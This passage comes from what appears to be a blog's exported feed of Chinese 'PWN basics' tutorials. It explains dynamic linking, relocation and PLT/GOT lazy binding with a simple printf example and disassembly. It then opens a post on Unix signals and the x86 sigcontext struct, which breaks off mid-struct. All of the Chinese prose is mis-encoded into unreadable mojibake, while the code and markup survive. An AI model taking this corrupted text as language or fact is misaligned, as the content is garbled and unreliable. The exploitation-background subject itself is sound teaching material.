èŠ‚ä¸­ã€‚<br>é‚£ä¹ˆç¬¬äºŒç§æƒ…å†µå°±æ˜¯ï¼Œå½“ç¬¬äºŒæ¬¡è°ƒç”¨test()@plt å‡½æ•°æ—¶ï¼Œå°±ä¼šé€šè¿‡ç¬¬ä¸€æ¡æŒ‡ä»¤è·³è½¬åˆ°çœŸæ­£çš„å‡½æ•°åœ°å€ã€‚æ•´ä¸ªè¿‡ç¨‹å°±æ˜¯æ‰€è¯´çš„é€šè¿‡ <strong>plt</strong> æ¥å®ç° <strong>å»¶è¿Ÿç»‘å®š</strong> ã€‚ç¨‹åºè°ƒç”¨å¤–éƒ¨å‡½æ•°çš„æ•´ä¸ªè¿‡ç¨‹å°±æ˜¯ï¼Œç¬¬ä¸€æ¬¡è®¿é—® test@plt å‡½æ•°æ—¶ï¼Œ<strong>åŠ¨æ€é“¾æ¥å™¨</strong>å°±ä¼šå»åŠ¨æ€å…±äº«æ¨¡å—ä¸­æŸ¥æ‰¾ test å‡½æ•°çš„çœŸå®åœ°å€ç„¶åå°†çœŸå®åœ°å€ä¿å­˜åˆ°test@gotä¸­(.got.plt)ï¼›ç¬¬äºŒæ¬¡è®¿é—®test@pltæ—¶ï¼Œå°±ç›´æ¥è·³è½¬åˆ°test@gotä¸­å»ã€‚</p><h3 id="ç®€ä¾‹"><a href="#ç®€ä¾‹" class="headerlink" title="ç®€ä¾‹"></a>ç®€ä¾‹</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_banner</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to World of PLT and GOT\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>ç¼–è¯‘</em></p><blockquote><p><code>gcc -Wall -g -o test.o -c test.c -m32</code></p></blockquote><p><em>é“¾æ¥</em></p><blockquote><p><code>gcc -o test test.o -m32</code></p><p>æ³¨æ„ï¼šç°ä»£Linuxç³»ç»Ÿéƒ½æ˜¯x86_64ç³»ç»Ÿäº†ï¼Œåé¢éœ€è¦å¯¹ä¸­é—´æ–‡ä»¶test.oä»¥åŠå¯æ‰§è¡Œæ–‡ä»¶teståç¼–è¯‘ï¼Œåˆ†ææ±‡ç¼–æŒ‡ä»¤ï¼Œå› æ­¤åœ¨è¿™é‡Œä½¿ç”¨-m32é€‰é¡¹ç”Ÿæˆi386æ¶æ„æŒ‡ä»¤è€Œéx86_64æ¶æ„æŒ‡ä»¤ã€‚</p></blockquote><p>ç»ç¼–è¯‘å’Œé“¾æ¥é˜¶æ®µä¹‹åï¼Œtestå¯æ‰§è¡Œæ–‡ä»¶ä¸­print_bannerå‡½æ•°çš„æ±‡ç¼–æŒ‡ä»¤ä¼šæ˜¯æ€æ ·çš„å‘¢ï¼Ÿæˆ‘çŒœåº”è¯¥ä¸ä¸‹é¢çš„æ±‡ç¼–ç±»ä¼¼ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">080483</span>cc &lt;print_banner&gt;:</span><br><span class="line"> <span class="number">80483</span>cc:    push %ebp</span><br><span class="line"> <span class="number">80483</span>cd:    mov  %esp, %ebp</span><br><span class="line"> <span class="number">80483</span>cf:    sub  $<span class="number">0x8</span>, %esp</span><br><span class="line"> <span class="number">80483</span>d2:    sub  $<span class="number">0xc</span>, %esp</span><br><span class="line"> <span class="number">80483</span>d5:    push $<span class="number">0x80484a8</span>  </span><br><span class="line"> <span class="number">80483</span>da:    call **&lt;<span class="built_in">printf</span>å‡½æ•°çš„åœ°å€&gt;**</span><br><span class="line"> <span class="number">80483</span>df:    add $<span class="number">0x10</span>, %esp</span><br><span class="line"> <span class="number">80483e2</span>:    nop</span><br><span class="line"> <span class="number">80483e3</span>:    leave</span><br><span class="line"> <span class="number">80483e4</span>:    ret</span><br></pre></td></tr></table></figure></p><p>print_bannerå‡½æ•°å†…è°ƒç”¨äº†printfå‡½æ•°ï¼Œè€Œprintfå‡½æ•°ä½äºglibcåŠ¨æ€åº“å†…ï¼Œæ‰€ä»¥åœ¨ç¼–è¯‘å’Œé“¾æ¥é˜¶æ®µï¼Œé“¾æ¥å™¨æ— æ³•çŸ¥çŸ¥é“è¿›ç¨‹è¿è¡Œèµ·æ¥ä¹‹åprintfå‡½æ•°çš„åŠ è½½åœ°å€ã€‚æ•…ä¸Šè¿°çš„<code>**&lt;printfå‡½æ•°åœ°å€&gt;**</code>ä¸€é¡¹æ˜¯æ— æ³•å¡«å……çš„ï¼Œåªæœ‰è¿›ç¨‹è¿è¿è¡Œåï¼Œprintfå‡½æ•°çš„åœ°å€æ‰èƒ½ç¡®å®šã€‚<br>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼šè¿›ç¨‹è¿è¡Œèµ·æ¥ä¹‹åï¼ŒglibcåŠ¨æ€åº“ä¹Ÿè£…è½½äº†ï¼Œprintfå‡½æ•°åœ°å€äº¦å·²ç¡®å®šï¼Œä¸Šè¿°callæŒ‡ä»¤å¦‚ä½•ä¿®æ”¹ï¼ˆé‡å®šä½ï¼‰å‘¢ï¼Ÿ<br>ä¸€ä¸ªç®€å•çš„æ–¹æ³•å°±æ˜¯å°†æŒ‡ä»¤ä¸­çš„<code>**&lt;printfå‡½æ•°åœ°å€&gt;**</code>ä¿®æ”¹printfå‡½æ•°çš„çœŸæ­£åœ°å€å³å¯ã€‚<br>ä½†è¿™ä¸ªæ–¹æ¡ˆé¢ä¸´ä¸¤ä¸ªé—®é¢˜ï¼š</p><ul><li>ç°ä»£æ“ä½œç³»ç»Ÿä¸å…è®¸ä¿®æ”¹ä»£ç æ®µï¼Œåªèƒ½ä¿®æ”¹æ•°æ®æ®µ</li><li>å¦‚æœprint_bannerå‡½æ•°æ˜¯åœ¨ä¸€ä¸ªåŠ¨æ€åº“ï¼ˆ.soå¯¹è±¡ï¼‰å†…ï¼Œä¿®æ”¹äº†ä»£ç æ®µï¼Œé‚£ä¹ˆå®ƒå°±æ— æ³•åšåˆ°ç³»ç»Ÿå†…æ‰€æœ‰è¿›ç¨‹å…±äº«åŒä¸€ä¸ªåŠ¨æ€åº“ã€‚<br>å› æ­¤ï¼Œprintfå‡½æ•°åœ°å€åªèƒ½å›å†™åˆ°æ•°æ®æ®µå†…ï¼Œè€Œä¸èƒ½å›å†™åˆ°ä»£ç æ®µä¸Šã€‚</li></ul><p>æ³¨æ„ï¼šåˆšæ‰è°ˆåˆ°çš„å›å†™ï¼Œæ˜¯æŒ‡è¿è¡Œæ—¶ä¿®æ”¹ï¼Œæ›´ä¸“ä¸šçš„ç§°è°“åº”è¯¥æ˜¯<em>è¿è¡Œæ—¶é‡å®šä½</em>ï¼Œä¸ä¹‹ç›¸å¯¹åº”çš„è¿˜æœ‰<em>é“¾æ¥æ—¶é‡å®šä½</em>ã€‚<br>è¯´åˆ°è¿™é‡Œï¼Œéœ€è¦æŠŠç¼–è¯‘é“¾æ¥è¿‡ç¨‹å†å±•å¼€ä¸€ä¸‹ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œæ¯ä¸ªç¼–è¯‘å•å…ƒï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ª.cæ–‡ä»¶ï¼Œæ¯”å¦‚å‰é¢ä¾‹å­ä¸­çš„test.cï¼‰éƒ½ä¼šç»å†ç¼–è¯‘å’Œé“¾æ¥ä¸¤ä¸ªé˜¶æ®µã€‚<br>ç¼–è¯‘é˜¶æ®µæ˜¯å°†.cæºä»£ç ç¿»è¯‘æˆæ±‡ç¼–æŒ‡ä»¤çš„ä¸­é—´æ–‡ä»¶ï¼Œæ¯”å¦‚ä¸Šè¿°çš„test.cæ–‡ä»¶ï¼Œç»è¿‡ç¼–è¯‘ä¹‹åï¼Œç”Ÿæˆtest.oä¸­é—´æ–‡ä»¶ã€‚print_bannerå‡½æ•°çš„æ±‡ç¼–æŒ‡ä»¤å¦‚ä¸‹ï¼ˆä½¿ç”¨å¼ºè°ƒå†…å®¹<em>objdump -d test.o</em>å‘½ä»¤å³å¯è¾“å‡ºï¼‰ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> &lt;print_banner&gt;:</span><br><span class="line">      <span class="number">0</span>:  <span class="number">55</span>                   push %ebp</span><br><span class="line">      <span class="number">1</span>:  <span class="number">89</span> e5                mov %esp, %ebp</span><br><span class="line">      <span class="number">3</span>:  <span class="number">83</span> ec <span class="number">08</span>             sub   $<span class="number">0x8</span>, %esp</span><br><span class="line">      <span class="number">6</span>:  c7 <span class="number">04</span> <span class="number">24</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> movl  $<span class="number">0x0</span>, (%esp)</span><br><span class="line">      d:  e8 fc ff ff ff       call  e &lt;print_banner+<span class="number">0xe</span>&gt;</span><br><span class="line">     <span class="number">12</span>:  c9                   leave</span><br><span class="line">     <span class="number">13</span>:  c3                   ret</span><br></pre></td></tr></table></figure><br>æ˜¯å¦æ³¨æ„åˆ°callæŒ‡ä»¤çš„æ“ä½œæ•°æ˜¯fc ff ff ffï¼Œç¿»è¯‘æˆ16è¿›åˆ¶æ•°æ˜¯0xfffffffcï¼ˆx86æ¶æ„æ˜¯å°ç«¯çš„å­—èŠ‚åºï¼‰ï¼Œçœ‹æˆæœ‰ç¬¦å·æ˜¯-4ã€‚è¿™é‡Œåº”è¯¥å­˜æ”¾printfå‡½æ•°çš„åœ°å€ï¼Œä½†ç”±äºç¼–è¯‘é˜¶æ®µæ— æ³•çŸ¥é“printfå‡½æ•°çš„åœ°å€ï¼Œæ‰€ä»¥é¢„å…ˆæ”¾ä¸€ä¸ª-4åœ¨è¿™é‡Œï¼Œç„¶åç”¨é‡å®šä½é¡¹æ¥æè¿°ï¼š<strong>è¿™ä¸ªåœ°å€åœ¨é“¾æ¥æ—¶è¦ä¿®æ­£ï¼Œå®ƒçš„ä¿®æ­£å€¼æ˜¯æ ¹æ®printfåœ°å€ï¼ˆæ›´ç¡®åˆ‡çš„å«æ³•åº”è¯¥æ˜¯ç¬¦å·ï¼Œé“¾æ¥å™¨çœ¼ä¸­åªæœ‰ç¬¦å·ï¼Œæ²¡æœ‰æ‰€è°“çš„å‡½æ•°å’Œå˜é‡ï¼‰æ¥ä¿®æ­£ï¼Œå®ƒçš„ä¿®æ­£æ–¹å¼æŒ‰ç›¸å¯¹å¼•ç”¨æ–¹å¼ã€‚</strong></p><p>è¿™ä¸ªè¿‡ç¨‹ç§°ä¸º<em>é“¾æ¥æ—¶é‡å®šä½</em>ï¼Œä¸åˆšæ‰æåˆ°çš„è¿è¡Œæ—¶é‡å®šä½å·¥ä½œåŸç†å®Œå…¨ä¸€æ ·ï¼Œåªæ˜¯ä¿®æ­£æ—¶æœºä¸åŒã€‚</p><p><em>é“¾æ¥é˜¶æ®µ</em>æ˜¯å°†ä¸€ä¸ªæˆ–è€…å¤šä¸ªä¸­é—´æ–‡ä»¶ï¼ˆ.oæ–‡ä»¶ï¼‰é€šè¿‡é“¾æ¥å™¨å°†å®ƒä»¬é“¾æ¥æˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œé“¾æ¥é˜¶æ®µä¸»è¦å®Œæˆä»¥ä¸‹äº‹æƒ…ï¼š</p><blockquote><p>-å„ä¸ªä¸­é—´æ–‡ä¹‹é—´çš„åŒåsectionåˆå¹¶</p><ul><li>å¯¹ä»£ç æ®µï¼Œæ•°æ®æ®µä»¥åŠå„ç¬¦å·è¿›è¡Œåœ°å€åˆ†é…</li><li>é“¾æ¥æ—¶é‡å®šä½ä¿®æ­£</li></ul></blockquote><p>é™¤äº†é‡å®šä½è¿‡ç¨‹ï¼Œå…¶å®ƒåŠ¨ä½œæ˜¯æ— æ³•ä¿®æ”¹ä¸­é—´æ–‡ä»¶ä¸­å‡½æ•°ä½“å†…æŒ‡ä»¤çš„ï¼Œè€Œé‡å®šä½è¿‡ç¨‹ä¹Ÿåªèƒ½æ˜¯ä¿®æ”¹æŒ‡ä»¤ä¸­çš„æ“ä½œæ•°ï¼Œæ¢å¥è¯è¯´ï¼Œ<strong>é“¾æ¥è¿‡ç¨‹æ— æ³•ä¿®æ”¹ç¼–è¯‘è¿‡ç¨‹ç”Ÿæˆçš„æ±‡ç¼–æŒ‡ä»¤ã€‚</strong><br>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼š<strong>ç¼–è¯‘é˜¶æ®µæ€ä¹ˆçŸ¥é“printfå‡½æ•°æ˜¯åœ¨glibcè¿è¡Œåº“çš„ï¼Œè€Œä¸æ˜¯å®šä¹‰åœ¨å…¶å®ƒ.oä¸­</strong><br>ç­”æ¡ˆï¼š<strong>ç¼–è¯‘å™¨æ˜¯æ— æ³•çŸ¥é“çš„</strong></p><p>é‚£ä¹ˆç¼–è¯‘å™¨åªèƒ½è€è€å®å®åœ°ç”Ÿæˆè°ƒç”¨printfçš„æ±‡ç¼–æŒ‡ä»¤ï¼Œprintfæ˜¯åœ¨glibcåŠ¨æ€åº“å®šä½ï¼Œæˆ–è€…æ˜¯åœ¨å…¶å®ƒ.oå®šä¹‰è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œå®ƒéƒ½èƒ½å·¥ä½œã€‚å¦‚æœæ˜¯åœ¨å…¶å®ƒ.oä¸­å®šä¹‰äº†printfå‡½æ•°ï¼Œé‚£åœ¨é“¾æ¥é˜¶æ®µï¼Œprintfåœ°å€å·²ç»ç¡®å®šï¼Œå¯ä»¥ç›´æ¥é‡å®šä½ã€‚å¦‚æœprintfå®šä¹‰åœ¨åŠ¨æ€åº“å†…ï¼ˆé“¾æ¥é˜¶æ®µæ˜¯å¯ä»¥çŸ¥é“printfåœ¨å“ªå®šä¹‰çš„ï¼Œåªæ˜¯å¦‚æœå®šä¹‰åœ¨åŠ¨æ€åº“å†…ä¸çŸ¥é“å®ƒçš„åœ°å€è€Œå·²ï¼‰ï¼Œé“¾æ¥é˜¶æ®µæ— æ³•åšé‡å®šä½ã€‚</p><p>æ ¹æ®å‰é¢è®¨è®ºï¼Œè¿è¡Œæ—¶é‡å®šä½æ˜¯æ— æ³•ä¿®æ”¹ä»£ç æ®µçš„ï¼Œåªèƒ½å°†printfé‡å®šä½åˆ°æ•°æ®æ®µã€‚é‚£åœ¨ç¼–è¯‘é˜¶æ®µå°±å·²ç”Ÿæˆå¥½çš„callæŒ‡ä»¤ï¼Œæ€ä¹ˆæ„ŸçŸ¥è¿™ä¸ªå·²é‡å®šä½å¥½çš„æ•°æ®æ®µå†…å®¹å‘¢ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯ï¼š<strong>é“¾æ¥å™¨ç”Ÿæˆä¸€æ®µé¢å¤–çš„å°ä»£ç ç‰‡æ®µï¼Œé€šè¿‡è¿™æ®µä»£ç æ”¯è·å–printfå‡½æ•°åœ°å€ï¼Œå¹¶å®Œæˆå¯¹å®ƒçš„è°ƒç”¨ã€‚</strong><br>é“¾æ¥å™¨ç”Ÿæˆé¢å¤–çš„ä¼ªä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// è°ƒç”¨printfçš„callæŒ‡ä»¤</span></span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">printf_stub:</span><br><span class="line">    mov rax, [<span class="built_in">printf</span>å‡½æ•°çš„å‚¨å­˜åœ°å€] <span class="comment">// è·å–printfé‡å®šä½ä¹‹åçš„åœ°å€</span></span><br><span class="line">    jmp rax <span class="comment">// è·³è¿‡å»æ‰§è¡Œprintfå‡½æ•°</span></span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line"><span class="built_in">printf</span>å‡½æ•°çš„å‚¨å­˜åœ°å€ï¼š</span><br><span class="line">ã€€ã€€è¿™é‡Œå‚¨å­˜<span class="built_in">printf</span>å‡½æ•°é‡å®šä½åçš„åœ°å€</span><br></pre></td></tr></table></figure><br>é“¾æ¥é˜¶æ®µå‘ç°printfå®šä¹‰åœ¨åŠ¨æ€åº“æ—¶ï¼Œé“¾æ¥å™¨ç”Ÿæˆä¸€æ®µå°ä»£ç print_stubï¼Œç„¶åprintf_stubåœ°å€å–ä»£åŸæ¥çš„printfã€‚å› æ­¤è½¬åŒ–ä¸ºé“¾æ¥é˜¶æ®µå¯¹printf_stubåšé“¾æ¥é‡å®šä½ï¼Œè€Œè¿è¡Œæ—¶æ‰å¯¹printfåšè¿è¡Œæ—¶é‡å®šä½ã€‚</p><h3 id="PLT-amp-GOT"><a href="#PLT-amp-GOT" class="headerlink" title="PLT &amp; GOT"></a>PLT &amp; GOT</h3><p>å‰é¢ç”±ä¸€ä¸ªç®€å•çš„ä¾‹å­è¯´æ˜åŠ¨æ€é“¾æ¥éœ€è¦è€ƒè™‘çš„å„ç§å› ç´ ï¼Œä½†å®é™…æ€»ç»“èµ·æ¥è¯´ä¸¤ç‚¹ï¼š</p><blockquote><ul><li>éœ€è¦å­˜æ”¾å¤–éƒ¨å‡½æ•°çš„æ•°æ®æ®µ</li><li>è·å–æ•°æ®æ®µå­˜æ”¾å‡½æ•°åœ°å€çš„ä¸€å°æ®µé¢å¤–ä»£ç </li></ul></blockquote><p>å¦‚æœå¯æ‰§è¡Œæ–‡ä»¶ä¸­è°ƒç”¨å¤šä¸ªåŠ¨æ€åº“å‡½æ•°ï¼Œé‚£æ¯ä¸ªå‡½æ•°éƒ½éœ€è¦è¿™ä¸¤æ ·ä¸œè¥¿ï¼Œè¿™æ ·æ¯æ ·ä¸œè¥¿å°±å½¢æˆä¸€ä¸ªè¡¨ï¼Œæ¯ä¸ªå‡½æ•°ä½¿ç”¨ä¸­çš„ä¸€é¡¹ã€‚</p><p>æ€»ä¸èƒ½æ¯æ¬¡éƒ½å«è¿™ä¸ªè¡¨é‚£ä¸ªè¡¨ï¼Œäºæ˜¯å¾—æ­£åã€‚å­˜æ”¾å‡½æ•°åœ°å€çš„æ•°æ®è¡¨ï¼Œç§°ä¸º<em>é‡å±€åç§»è¡¨ï¼ˆGOT, Global Offset Tableï¼‰</em>ï¼Œè€Œé‚£ä¸ªé¢å¤–ä»£ç æ®µè¡¨ï¼Œç§°ä¸º<em>ç¨‹åºé“¾æ¥è¡¨ï¼ˆPLTï¼ŒProcedure Link Tableï¼‰</em>ã€‚</p><p><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250120211843.png" alt="Pasted image 20250120211843"><br>å½“ç„¶è¿™ä¸ªåŸç†å›¾å¹¶ä¸æ˜¯Linuxä¸‹çš„PLT/GOTçœŸå®è¿‡ç¨‹ï¼ŒLinuxä¸‹çš„PLT/GOTè¿˜æœ‰æ›´å¤šç»†èŠ‚è¦è€ƒè™‘äº†ã€‚è¿™ä¸ªå›¾åªæ˜¯å°†è¿™äº›èºå£°å…¨éƒ¨æ¶ˆé™¤ï¼Œè®©å¤§å®¶æ˜ç¡®çœ‹åˆ°PLT/GOTæ˜¯å¦‚ä½•ç©¿é’ˆå¼•çº¿çš„ã€‚</p><h2 id="å›¾è§£"><a href="#å›¾è§£" class="headerlink" title="å›¾è§£"></a>å›¾è§£</h2><p>ç¨‹åºå¼€å§‹æ‰§è¡Œæ—¶ï¼Œ.pltèŠ‚å’Œ.got.pltèŠ‚çš„çŠ¶æ€å¦‚ä¸‹ï¼š<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250127193949.png" alt="Pasted image 20250127193949"></p><ul><li><code>printf@plt</code>æ˜¯æŒ‡pltèŠ‚ä¸­ä¸printfç›¸å…³ä»£ç çš„åœ°å€ï¼Œ<code>printf@got</code>åŒç†ï¼›</li><li><code>printf@plt+6</code>æ°å¥½æ˜¯<code>get_address</code>çš„é¦–åœ°å€ï¼›</li><li><code>*(printf@got)</code>æ˜¯æŒ‡åœ°å€ä¸º<code>printf@got</code>çš„å†…å­˜å•å…ƒä¸­çš„æ•°æ®ï¼ˆå›¾ä¸­ä¸º<code>printf@plt+6</code>ï¼‰</li><li><code>get_address</code>æ˜¯ä¸€ç³»åˆ—æ“ä½œï¼Œè¯¥æ“ä½œçš„åŠŸèƒ½æ˜¯å°†printfåœ¨å†…å­˜ä¸­çš„å®é™…åœ°å€å¡«å†™åˆ°<code>printf@got</code>è¿™ä¸€åœ°å€å¯¹åº”çš„å†…å­˜å•å…ƒä¸­ã€‚</li></ul><p>é¦–æ¬¡è°ƒç”¨printfçš„ç¨‹åºæ‰§è¡Œæµå¦‚ä¸‹ï¼š<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250127194035.png" alt="Pasted image 20250127194035"></p><ul><li>â‘ ï¼šç¨‹åºæ‰§è¡Œè‡³<code>call printf@plt</code>ï¼Œå› æ­¤è·³è½¬è‡³ç›¸åº”åœ°å€ï¼›</li><li>â‘¡ï¼šè·³è½¬åˆ°<code>printf@plt</code>åï¼Œæ‰§è¡Œ<code>jmp *(printf@got)</code>ï¼Œä½†ç”±äº<code>printf@got</code>ä¿å­˜çš„æ•°æ®æ˜¯<code>printf@plt+6</code>ï¼Œå› æ­¤ç¨‹åºåˆè·³è½¬è‡³get_addressçš„é¦–åœ°å€ï¼›</li><li>â‘¢ï¼šç¨‹åºæ‰§è¡Œ<code>get_address</code>ï¼Œå°†printfçš„çœŸå®åœ°å€å†™å…¥<code>printf@got</code>ä¸­ï¼ˆå›¾ä¸­æœªä½“ç°ï¼‰</li></ul><p>å½“å®Œæˆä¸Šè¿°æ“ä½œåï¼Œç¨‹åºä¾¿èƒ½ç¬¬ä¸€æ¬¡æ‰§è¡Œprintfã€‚å¹¶ä¸”æ­¤æ—¶.pltèŠ‚å’Œ.got.pltèŠ‚çš„çŠ¶æ€å˜ä¸ºï¼š<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250127194210.png" alt="Pasted image 20250127194210"><br>å¯ä»¥çœ‹åˆ°ï¼Œæ­¤æ—¶printf@gotä¸­ä¿å­˜çš„åœ°å€å˜ä¸ºäº†printfçœŸæ­£çš„é¦–åœ°å€ã€‚<br>æ˜¾ç„¶ï¼Œåç»­å†æ¬¡æ‰§è¡Œ<code>jmp *(printf@got)</code>å‘½ä»¤æ—¶ï¼Œç¨‹åºå¯ä»¥ç›´æ¥è·³è½¬è‡³printfçš„é¦–åœ°å€ï¼Œå¹¶æ‰§è¡Œç›¸å…³å‘½ä»¤ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNåŸºç¡€-something_about_æ“ä½œç³»ç»Ÿ</title>
      <link href="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-something-about-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
      <url>/2025/02/09/PWN%E5%9F%BA%E7%A1%80-something-about-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="æ“ä½œç³»ç»Ÿ"><a href="#æ“ä½œç³»ç»Ÿ" class="headerlink" title="æ“ä½œç³»ç»Ÿ"></a>æ“ä½œç³»ç»Ÿ</h2><h3 id="signalæœºåˆ¶"><a href="#signalæœºåˆ¶" class="headerlink" title="signalæœºåˆ¶"></a>signalæœºåˆ¶</h3><p><strong>signal æœºåˆ¶æ˜¯ç±» unix ç³»ç»Ÿä¸­è¿›ç¨‹ä¹‹é—´<em>ç›¸äº’ä¼ é€’ä¿¡æ¯</em>çš„ä¸€ç§æ–¹æ³•</strong>ã€‚ä¸€èˆ¬ï¼Œæˆ‘ä»¬ä¹Ÿç§°å…¶ä¸º<strong>è½¯ä¸­æ–­ä¿¡å·</strong>ï¼Œæˆ–è€…<strong>è½¯ä¸­æ–­</strong>ã€‚æ¯”å¦‚è¯´ï¼Œè¿›ç¨‹ä¹‹é—´å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨ kill æ¥å‘é€è½¯ä¸­æ–­ä¿¡å·ã€‚ä¸€èˆ¬åˆ†ä¸ºä¸‰å¤§æ­¥ï¼š</p><blockquote><p>killå¹¶ä¸æ˜¯å­—é¢æ„æ€â€”â€”æ€æ­»è¿›ç¨‹<br>KILLåŠŸèƒ½æè¿°ï¼šç”¨äºå‘ä»»ä½•è¿›ç¨‹ç»„æˆ–è¿›ç¨‹å‘é€ä¿¡å·</p><ol><li>å†…æ ¸å‘æŸä¸ªè¿›ç¨‹<strong>å‘é€signalæœºåˆ¶</strong>ï¼Œè¯¥è¿›ç¨‹ä¼šè¢«æš‚æ—¶<strong>æŒ‚èµ·ï¼Œè¿›å…¥å†…æ ¸æ€</strong></li><li>å†…æ ¸ä¼šä¸ºè¯¥è¿›ç¨‹ä¿å­˜ç›¸åº”çš„ä¸Šä¸‹æ–‡ï¼Œ<strong>è·³è½¬åˆ°ä¹‹å‰æ³¨å†Œå¥½çš„signal handlerä¸­å¤„ç†signal</strong></li><li><strong>signalè¿”å›</strong></li><li>å†…æ ¸ä¸ºè¿›ç¨‹æ¢å¤ä¹‹å‰ä¿ç•™çš„ä¸Šä¸‹æ–‡ï¼Œæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œ<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-something-about-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Pasted image 20250207175656.png" alt="Pasted image 20250207175656"><br>å†…æ ¸åœ¨ä¿å­˜è¿›ç¨‹ç›¸åº”ä¸Šä¸‹æ–‡é˜¶æ®µ<strong>ä¸»è¦æ˜¯å°†æ‰€æœ‰å¯„å­˜å™¨å‹å…¥æ ˆä¸­ï¼Œä»¥åŠå‹å…¥ signal ä¿¡æ¯ï¼Œä»¥åŠæŒ‡å‘ sigreturn çš„ç³»ç»Ÿè°ƒç”¨åœ°å€</strong>ã€‚æ­¤æ—¶æ ˆçš„ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬ç§° ucontext ä»¥åŠ siginfo è¿™ä¸€æ®µä¸º <strong>Signal Frame</strong>ã€‚<em>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸€éƒ¨åˆ†æ˜¯åœ¨ç”¨æˆ·è¿›ç¨‹çš„åœ°å€ç©ºé—´çš„</em>ã€‚ä¹‹åä¼šè·³è½¬åˆ°æ³¨å†Œè¿‡çš„ signal handler ä¸­å¤„ç†ç›¸åº”çš„ signalã€‚å› æ­¤ï¼Œå½“ signal handler æ‰§è¡Œå®Œä¹‹åï¼Œå°±ä¼šæ‰§è¡Œ sigreturn ä»£ç ã€‚<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-something-about-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Pasted image 20250207175647.png" alt="Pasted image 20250207175647"><br>å¯¹äº signal Frame æ¥è¯´ï¼Œä¼šå› ä¸ºæ¶æ„çš„ä¸åŒè€Œæœ‰æ‰€åŒºåˆ«ï¼Œè¿™é‡Œç»™å‡ºåˆ†åˆ«ç»™å‡º x86 ä»¥åŠ x64 çš„ sigcontext</li></ol><ul><li>x86<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//x86</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs, __gsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs, __fsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> es, __esh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ds, __dsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ecx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eax;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trapno;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> err;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eip;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs, __csh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp_at_signal;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span 